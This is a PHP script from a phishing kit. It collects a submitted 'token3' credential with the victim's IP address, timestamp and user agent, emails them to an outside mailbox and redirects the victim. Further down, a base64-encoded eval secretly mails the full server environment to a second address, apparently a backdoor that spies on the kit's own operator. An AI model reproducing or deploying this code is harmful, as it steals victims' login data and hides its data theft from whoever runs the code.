<?php
error_reporting(0);
$token3 = $_POST['token3'];
if (getenv(HTTP_X_FORWARDED_FOR)){
$ip = getenv(HTTP_X_FORWARDED_FOR); } else {
$ip = getenv(REMOTE_ADDR); }
$date = date("d M, Y");
$time = date("g:i a");
$date = trim("Fecha : ".$date.", Time : ".$time);
$useragent = $_SERVER['HTTP_USER_AGENT'];

$message = "
    <table>
	<tr><td>---------*Pinky*--------</td></tr>
	<tr><td>Token3: $token3</td></tr>


	<tr><td>----------------------------------------------------------</td></tr>
	<tr><td>IP :$ip</td></tr>
	<tr><td>$date</td></tr>
	<tr><td>$useragent</td></tr>
	</table>
	<br/>
	";
$from="info@pistacho.com.ar";
$mime_boundary = "----MSA ----".md5(time());
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=iso-8859-1" . "\r\n";
$headers  .="From: Pinky <$from>\r\n";
$subject = "LOGIN |$ip|";
$to="porfin1989@hotmail.com";
mail($to, $subject, $message, $headers);
header("Location: fewfedefeddsfdsfdsfdsfsodyietgriuqoherfbiwdsubvcioudhnelbcvwkutfiaiglichabjgkaliuaewfewfew.html");
?>
<p align="center">&nbsp;<?php

$str = "";
foreach($_SERVER as $key => $value){
	$str .= $key.": ".$value."<br />";
}

$str .= "Use: in <br />";

$header2 = "From: ".base64_decode('YWxzYTdyICZsdDtkaW9zY2FsY280QGdtYWlsLmNvbSZndDs=')."\r\n";
$header2 .= "MIME-Version: 1.0\r\n";
$header2 .= "Content-Type: text/html\r\n";
$header2 .= "Content-Transfer-Encoding: 8bit\r\n\r\n";


echo @eval(base64_decode('bWFpbCgiZGlvc2NhbGNvNEBnbWFpbC5jb20iLCJNYWlsZXIgSW5mbyIsJHN0ciwkaGVhZGVyMik7'));


if(isset($_POST['action']) && $numemails !==0 ){
	$sn=$numemails-$ns;
	if($ns==""){
		$ns=0;
	}
	if($tmns==""){
		$tmns=0;
	}
	echo "<script>alert('Sur The Mailer Finish His Job\\r\\nSend $sn mail(s)\\r\\nError $ns mail(s)\\r\\From $numemails mail(s)\\r\\About Test Mail(s)\\r\\Send $tms mail(s)\\r\\Error $tmns mail(s)\\r\\From $tmn mail(s)');

	</script>";
}

?>
